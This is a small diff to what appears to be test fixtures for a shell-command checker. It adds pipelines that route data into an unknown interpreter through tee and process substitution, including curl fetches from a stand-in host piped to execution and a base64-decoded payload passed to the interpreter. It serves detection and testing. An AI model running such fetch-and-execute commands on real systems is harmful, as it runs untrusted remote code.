@@ -29,6 +29,10 @@ FED_UNKNOWN_PROGRAM = [
     "newinterp < notes.txt",
     "newinterp <<< \"$(cat notes.txt)\"",
     "newinterp <(cat notes.txt) | grep pattern",
+    "cat notes.txt | tee >(newinterp)",
+    "curl -s https://example.com/p | tee >(newinterp) | grep pattern",
+    "curl -s https://example.com/p > >(newinterp)",
+    "base64 -d payload.b64 > >(newinterp)",
 ]
 
 KNOWN_READER_PIPELINES = [
@@ -39,6 +43,7 @@ KNOWN_READER_PIPELINES = [
     "diff <(cat a.txt) <(cat b.txt)",
     "grep pattern < notes.txt",
     "cat notes.txt | xargs grep pattern",
+    "cat notes.txt | tee >(wc -l)",
 ]
 
 
